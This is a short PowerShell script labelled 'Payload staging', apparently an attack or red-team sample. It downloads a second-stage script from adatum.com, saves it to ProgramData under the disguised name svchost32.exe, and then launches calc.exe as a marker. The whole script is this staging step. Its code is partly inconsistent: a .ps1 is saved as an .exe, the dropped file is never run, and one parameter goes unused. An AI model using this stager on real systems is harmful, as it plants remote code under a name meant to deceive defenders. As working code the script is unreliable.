
<# Payload staging #>
[CmdletBinding()]
param(
    [string]$TargetUrl = "http://adatum.com/stage1.ps1",
    [string]$DropPath = "C:\ProgramData\svchost32.exe",
    [int]$ConnectionTimeout = 92
)
Start-BitsTransfer -Source $TargetUrl -Destination $DropPath
Start-Process -FilePath "calc.exe"
$StageMarker = "stage-12"
